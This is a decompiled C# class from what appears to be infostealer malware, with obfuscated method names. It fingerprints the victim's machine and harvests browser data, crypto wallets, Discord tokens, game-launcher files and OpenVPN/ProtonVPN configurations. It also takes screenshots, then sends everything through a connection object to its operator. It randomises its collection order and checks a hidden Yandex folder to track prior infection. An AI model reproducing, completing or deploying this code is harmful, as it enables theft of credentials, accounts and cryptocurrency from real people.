using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Windows.Forms;

// Token: 0x0200000D RID: 13
public class FullInfoSender : EntityResolver
{
	// Token: 0x06000062 RID: 98 RVA: 0x000057B4 File Offset: 0x00003BB4
	public FullInfoSender()
	{
		EntityResolver.Main = new Enter[]
		{
			new Enter(FullInfoSender.sdfk83hkasd),
			new Enter(FullInfoSender.adkasd8u3hbasd),
			new Enter(FullInfoSender.sdfk38jasd),
			new Enter(FullInfoSender.slkahs2),
			new Enter(FullInfoSender.asdak83jq),
			new Enter(FullInfoSender.kasdihbfpfduqw),
			new Enter(FullInfoSender.asdlasd9h34),
			new Enter(FullInfoSender.dvsjiohq3),
			new Enter(FullInfoSender.blvnzcwqe),
			new Enter(FullInfoSender.aso0shq2),
			new Enter(FullInfoSender.sdkf9h234as),
			new Enter(FullInfoSender.asdoiad0123),
			new Enter(FullInfoSender.asdaid9h24kasd),
			new Enter(FullInfoSender.a9duh3zd),
			new Enter(FullInfoSender.sdf923)
		};
		EntityResolver.First = new Enter[]
		{
			new Enter(FullInfoSender.sf34asd21),
			new Enter(FullInfoSender.sdfkas83),
			new Enter(FullInfoSender.sdfm83kjasd),
			new Enter(FullInfoSender.kkdhfakdasd),
			new Enter(FullInfoSender.kadsoji83),
			new Enter(FullInfoSender.gkdsi8y234)
		};
		Random rnd = new Random();
		EntityResolver.Main = (from x in EntityResolver.Main
		orderby rnd.Next()
		select x).ToArray<Enter>();
		EntityResolver.First = (from x in EntityResolver.First
		orderby rnd.Next()
		select x).ToArray<Enter>();
	}

	// Token: 0x06000063 RID: 99 RVA: 0x00005978 File Offset: 0x00003D78
	public override bool Invoker(ConnectionProvider connection, Entity2 settings, ref Entity7 result)
	{
		return FullInfoSender.sdfk8h34(connection, settings, ref result);
	}

	// Token: 0x06000064 RID: 100 RVA: 0x00005994 File Offset: 0x00003D94
	public static bool sdfk8h34(ConnectionProvider connection, Entity2 settings, ref Entity7 result)
	{
		bool result2;
		try
		{
			result.Id7 = new Entity1
			{
				Id2 = new List<string>(),
				Id6 = new List<Entity9>(),
				Id7 = new List<Entity12>(),
				Id16 = new List<Entity5>(),
				Id10 = new List<Entity5>(),
				Id8 = new List<Entity4>(),
				Id15 = new List<Entity5>(),
				Id12 = new List<Entity12>(),
				Id13 = new List<Entity5>(),
				Id4 = new List<string>(),
				Id14 = new List<Entity5>(),
				Id9 = new List<Entity5>(),
				Id11 = new List<Entity5>(),
				Id1 = new List<string>(),
				Id3 = new List<string>(),
				Id5 = new List<Entity3>()
			};
			result.Id11 = IPv4Helper.GetDefaultIPv4Address();
			result.Id15 = FullInfoSender.Visible();
			result.PreCheck();
			foreach (Enter enter in EntityResolver.First)
			{
				try
				{
					enter(connection, settings, ref result);
				}
				catch (InvalidOperationException ex)
				{
					throw ex;
				}
				catch (Exception)
				{
				}
			}
			FullInfoSender.asdk9y3(connection, settings, ref result);
			connection.Id4(result);
			result2 = true;
		}
		catch (InvalidOperationException ex2)
		{
			throw ex2;
		}
		catch (Exception)
		{
			result2 = false;
		}
		return result2;
	}

	// Token: 0x06000065 RID: 101 RVA: 0x00005B54 File Offset: 0x00003F54
	public static bool Visible()
	{
		try
		{
			string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Yandex\\YaAddon");
			bool flag = Directory.Exists(path);
			if (!flag)
			{
				Directory.CreateDirectory(path);
				return false;
			}
			bool flag2 = new DirectoryInfo(path).CreationTime < DateTime.Now.AddMonths(-3);
			if (flag2)
			{
				Directory.Delete(path);
				Directory.CreateDirectory(path);
				return false;
			}
			return true;
		}
		catch
		{
		}
		return false;
	}

	// Token: 0x06000066 RID: 102 RVA: 0x00005BE8 File Offset: 0x00003FE8
	public static bool asdk9y3(ConnectionProvider connection, Entity2 settings, ref Entity7 result)
	{
		bool result2;
		try
		{
			foreach (Enter enter in EntityResolver.Main)
			{
				try
				{
					enter(connection, settings, ref result);
				}
				catch (InvalidOperationException ex)
				{
					throw ex;
				}
				catch (Exception)
				{
				}
			}
			result2 = true;
		}
		catch (InvalidOperationException ex2)
		{
			throw ex2;
		}
		catch (Exception)
		{
			result2 = false;
		}
		return result2;
	}

	// Token: 0x06000067 RID: 103 RVA: 0x00005C74 File Offset: 0x00004074
	public static void kadsoji83(ConnectionProvider connection, Entity2 settings, ref Entity7 result)
	{
		result.Id1 = CryptoHelper.GetMd5Hash(Environment.UserDomainName + Environment.UserName + SystemInfoHelper.GetSerialNumber()).Replace("-", string.Empty);
	}

	// Token: 0x06000068 RID: 104 RVA: 0x00005CA6 File Offset: 0x000040A6
	public static void kkdhfakdasd(ConnectionProvider connection, Entity2 settings, ref Entity7 result)
	{
		result.Id14 = Assembly.GetExecutingAssembly().Location;
	}

	// Token: 0x06000069 RID: 105 RVA: 0x00005CBA File Offset: 0x000040BA
	public static void sdfm83kjasd(ConnectionProvider connection, Entity2 settings, ref Entity7 result)
	{
		result.Id5 = InputLanguage.CurrentInputLanguage.Culture.EnglishName;
		result.Id4 = SystemInfoHelper.GetWindowsVersion();
	}

	// Token: 0x0600006A RID: 106 RVA: 0x00005CE0 File Offset: 0x000040E0
	public static void sdfkas83(ConnectionProvider connection, Entity2 settings, ref Entity7 result)
	{
		result.Id6 = GdiHelper.GetVirtualDisplaySize().ToString();
	}

	// Token: 0x0600006B RID: 107 RVA: 0x00005D08 File Offset: 0x00004108
	public static void gkdsi8y234(ConnectionProvider connection, Entity2 settings, ref Entity7 result)
	{
		result.Id10 = TimeZoneInfo.Local.DisplayName;
	}

	// Token: 0x0600006C RID: 108 RVA: 0x00005D1C File Offset: 0x0000411C
	public static void sf34asd21(ConnectionProvider connection, Entity2 settings, ref Entity7 result)
	{
		result.Id3 = Environment.UserName;
	}

	// Token: 0x0600006D RID: 109 RVA: 0x00005D2C File Offset: 0x0000412C
	public static void sdfk83hkasd(ConnectionProvider connection, Entity2 settings, ref Entity7 result)
	{
		List<Entity3> list = new List<Entity3>();
		foreach (Entity3 item in SystemInfoHelper.GetProcessors())
		{
			list.Add(item);
		}
		foreach (Entity3 item2 in SystemInfoHelper.GetGraphicCards())
		{
			list.Add(item2);
		}
		list.Add(new Entity3
		{
			Id1 = new string(new char[]
			{
				'T',
				'o',
				't',
				'a',
				'l',
				' ',
				'o',
				'f',
				' ',
				'R',
				'A',
				'M'
			}),
			Id3 = Entity14.Id2,
			Id2 = SystemInfoHelper.CollectMemory()
		});
		result.Id7.Id5 = list;
	}

	// Token: 0x0600006E RID: 110 RVA: 0x00005E24 File Offset: 0x00004224
	public static void adkasd8u3hbasd(ConnectionProvider connection, Entity2 settings, ref Entity7 result)
	{
		result.Id7.Id8 = SystemInfoHelper.GetBrowsers();
	}

	// Token: 0x0600006F RID: 111 RVA: 0x00005E38 File Offset: 0x00004238
	public static void sdfk38jasd(ConnectionProvider connection, Entity2 settings, ref Entity7 result)
	{
		result.Id7.Id3 = SystemInfoHelper.ListOfPrograms();
	}

	// Token: 0x06000070 RID: 112 RVA: 0x00005E4C File Offset: 0x0000424C
	public static void slkahs2(ConnectionProvider connection, Entity2 settings, ref Entity7 result)
	{
		Entity1 id = result.Id7;
		List<string> vs = SystemInfoHelper.GetVs();
		id.Id1 = ((vs != null) ? vs.ToList<string>() : null);
	}

	// Token: 0x06000071 RID: 113 RVA: 0x00005E6C File Offset: 0x0000426C
	public static void asdak83jq(ConnectionProvider connection, Entity2 settings, ref Entity7 result)
	{
		result.Id7.Id4 = SystemInfoHelper.ListOfProcesses();
	}

	// Token: 0x06000072 RID: 114 RVA: 0x00005E80 File Offset: 0x00004280
	public static void kasdihbfpfduqw(ConnectionProvider connection, Entity2 settings, ref Entity7 result)
	{
		result.Id7.Id2 = SystemInfoHelper.AvailableLanguages();
	}

	// Token: 0x06000073 RID: 115 RVA: 0x00005E94 File Offset: 0x00004294
	public static void sdf923(ConnectionProvider connection, Entity2 settings, ref Entity7 result)
	{
		bool id = settings.Id5;
		if (id)
		{
			result.Id12 = GdiHelper.GetImageBase();
		}
	}

	// Token: 0x06000074 RID: 116 RVA: 0x00005EBC File Offset: 0x000042BC
	public static void asdlasd9h34(ConnectionProvider connection, Entity2 settings, ref Entity7 result)
	{
		bool id = settings.Id6;
		if (id)
		{
			List<Entity5> id2 = FileScanning.Search(new Extractor[]
			{
				new RosComNadzor()
			});
			result.Id7.Id15 = id2;
		}
	}

	// Token: 0x06000075 RID: 117 RVA: 0x00005EF8 File Offset: 0x000042F8
	public static void dvsjiohq3(ConnectionProvider connection, Entity2 settings, ref Entity7 result)
	{
		bool id = settings.Id1;
		if (id)
		{
			List<Entity9> list = new List<Entity9>();
			list.AddRange(Entity18.Id1(settings.Id11));
			list.AddRange(Entity20.Id1(settings.Id12));
			result.Id7.Id6 = list;
		}
	}

	// Token: 0x06000076 RID: 118 RVA: 0x00005F4C File Offset: 0x0000434C
	public static void blvnzcwqe(ConnectionProvider connection, Entity2 settings, ref Entity7 result)
	{
		bool id = settings.Id2;
		if (id)
		{
			result.Id7.Id9 = FileSearcher.Search(settings.Id10);
		}
	}

	// Token: 0x06000077 RID: 119 RVA: 0x00005F80 File Offset: 0x00004380
	public static void aso0shq2(ConnectionProvider connection, Entity2 settings, ref Entity7 result)
	{
		bool id = settings.Id3;
		if (id)
		{
			result.Id7.Id7 = Entity19.Id1();
		}
	}

	// Token: 0x06000078 RID: 120 RVA: 0x00005FAC File Offset: 0x000043AC
	public static void sdkf9h234as(ConnectionProvider connection, Entity2 settings, ref Entity7 result)
	{
		bool id = settings.Id4;
		if (id)
		{
			BrEx brEx = new BrEx();
			brEx.Init(settings.Id11);
			List<Entity5> list = FileScanning.Search(new Extractor[]
			{
				new AllWallets(),
				brEx
			});
			list.AddRange(ConfigReader.Read(settings.Id13));
			result.Id7.Id11 = list;
		}
	}

	// Token: 0x06000079 RID: 121 RVA: 0x00006010 File Offset: 0x00004410
	public static void asdoiad0123(ConnectionProvider connection, Entity2 settings, ref Entity7 result)
	{
		bool id = settings.Id9;
		if (id)
		{
			Entity1 id2 = result.Id7;
			IEnumerable<Entity5> tokens = Discord.GetTokens();
			id2.Id16 = ((tokens != null) ? tokens.ToList<Entity5>() : null);
		}
	}

	// Token: 0x0600007A RID: 122 RVA: 0x00006048 File Offset: 0x00004448
	public static void asdaid9h24kasd(ConnectionProvider connection, Entity2 settings, ref Entity7 result)
	{
		bool id = settings.Id8;
		if (id)
		{
			result.Id7.Id10 = FileScanning.Search(new Extractor[]
			{
				new GameLauncher()
			});
		}
	}

	// Token: 0x0600007B RID: 123 RVA: 0x00006084 File Offset: 0x00004484
	public static void a9duh3zd(ConnectionProvider connection, Entity2 settings, ref Entity7 result)
	{
		bool id = settings.Id7;
		if (id)
		{
			result.Id7.Id12 = Entity21.Id1();
			result.Id7.Id13 = FileScanning.Search(new Extractor[]
			{
				new OpenVPN()
			});
			result.Id7.Id14 = FileScanning.Search(new Extractor[]
			{
				new РrоtoнVРN()
			});
		}
	}
}
